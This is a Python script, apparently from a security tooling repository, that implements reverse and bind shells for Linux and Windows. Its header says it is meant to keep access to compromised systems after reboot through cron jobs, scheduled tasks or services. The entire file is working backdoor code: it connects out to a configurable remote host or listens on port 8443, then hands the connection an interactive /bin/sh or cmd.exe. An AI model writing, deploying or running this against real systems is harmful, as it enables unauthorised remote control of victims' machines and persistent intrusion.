#!/usr/bin/python3
#Title: bd.py
#Author: ApexPredator
#License: MIT
#Github: https://github.com/ApexPredator-InfoSec/back_door
#Description: This script provides a reverse shell or bind shell on Linux or Windows systems. It can be used to establish persistence after compromising a system by setting a cronjob, scheduled task, or service to run the script to reestablish connection after reboots, etc.
import socket
import subprocess
import os
import argparse
import threading
import sys

RHOST = '127.0.0.1'
RPORT = 443
LHOST = '0.0.0.0'
LPORT = 8443

parser = argparse.ArgumentParser(prog='bd.py', usage='python3 bd.py -l -r; python3 bd.py -w -b') #build argument list
parser.add_argument('-l', '--linux', help='Linux target', required=False, action = 'store_const', const = True)
parser.add_argument('-w', '--windows', help='Windows target', required=False, action = 'store_const', const = True)
parser.add_argument('-r','--rvsh', help='reverse shell', required=False, action = 'store_const', const = True)
parser.add_argument('-b','--bndsh', help='bind shell', required=False, action = 'store_const', const = True)
args = parser.parse_args()

def rvshl():

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("%s" %RHOST,RPORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p = subprocess.call(["/bin/sh","-i"])

    return

def bndshl():

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("%s" %LHOST,LPORT))
    s.listen(5)
    c,a=s.accept()
    os.dup2(c.fileno(),0)
    os.dup2(c.fileno(),1)
    os.dup2(c.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

    return
#Windows reverse shell and bind shells modified from code found https://stackoverflow.com/questions/37991717/python-windows-reverse-shell-one-liner
def soc2proc(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def proc2soc(s, p):
    while True:
        s.send(p.stdout.read(1))

def rvshw():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("%s" %RHOST,RPORT))

    p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    soc2proc_thread = threading.Thread(target=soc2proc, args=[s, p])
    soc2proc_thread.daemon = True
    soc2proc_thread.start()

    proc2soc_thread = threading.Thread(target=proc2soc, args=[s, p])
    proc2soc_thread.daemon = True
    proc2soc_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

    return

def bndshw():

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(('0.0.0.0',8443))
    s.listen(1)
    s,addr = s.accept()

    p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    soc2proc_thread = threading.Thread(target=soc2proc, args=[s, p])
    soc2proc_thread.daemon = True
    soc2proc_thread.start()

    proc2soc_thread = threading.Thread(target=proc2soc, args=[s, p])
    proc2soc_thread.daemon = True
    proc2soc_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

    return

def main():

    if args.linux:
        if args.rvsh:
            rvshl()
        elif args.bndsh:
            bndshl()
    elif args.windows:
        if args.rvsh:
            rvshw()
        elif args.bndsh:
            bndshw()
    else:
        print("[-] Error processing arguments")
        sys.exit(-1)

if __name__ == '__main__':

    main()
